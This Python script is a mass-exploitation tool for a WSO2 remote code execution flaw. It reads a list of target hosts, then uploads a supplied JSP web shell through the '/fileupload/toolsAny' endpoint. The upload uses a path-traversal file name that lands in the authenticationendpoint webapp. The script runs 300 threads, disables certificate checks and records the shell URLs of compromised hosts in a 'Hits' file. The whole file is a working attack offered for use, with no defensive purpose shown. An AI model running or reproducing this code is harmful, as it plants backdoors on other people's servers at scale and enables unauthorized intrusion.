import requests, urllib3, sys
from time import strftime, sleep
import os
from Auth import Auth
from colorama import Fore, init
from threading import Thread
from concurrent.futures import ThreadPoolExecutor
import threadpool
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

os.system('cls')

if len(sys.argv) != 3:
    print(f"Usage: python {sys.argv[0]} host.txt shell.jsp")

print("Welcome Use WSO2 RCE")
print("Program by ShizukuSkiddingGod in less than 5 minutes:)")
#Auth().Verify()
    
host = sys.argv[1]
shelljsp = sys.argv[2]
f = open(host, encoding='utf-8')
shellf = open(shelljsp, encoding='utf-8')
shell = shellf.read()
unix = str(strftime('[%d-%m-%Y %H-%M-%S]'))
savepath = f'''Hits/{unix}'''
threads = 300
pool = ThreadPoolExecutor(max_workers=threads)
if not os.path.exists('Hits'):
    os.mkdir('Hits')
if not os.path.exists(savepath):
    os.mkdir(savepath)

global line
line = f.readline()
line = line.strip()
files = {f"../../../../repository/deployment/server/webapps/authenticationendpoint/{shelljsp}": shell}
L = []

def run():
    global line
    while line:
        try:
            response = requests.post(f'{line}/fileupload/toolsAny', files=files, verify=False)
            print(f'''{(Fore.LIGHTGREEN_EX)}[+] {line}{(Fore.RESET)}''')
            with open(f'''{(savepath)}/Hits.txt''', 'a+') as (hitsf):
                hitsf.write(f'''{line}/authenticationendpoint/{shelljsp}\n''')
        except:
            print(f'''{(Fore.LIGHTRED_EX)}[-] {line}{(Fore.RESET)}''')
            with open(f'''{(savepath)}/Bad.txt''', 'a+') as (badf):
                badf.write(f'''{line}\n''')
        finally:
            line = f.readline()
            line = line.strip()
pool = threadpool.ThreadPool(300)
prequests = threadpool.makeRequests(run, L)
[pool.putRequest(req) for req in prequests]
pool.wait()
f.close()
shellf.close()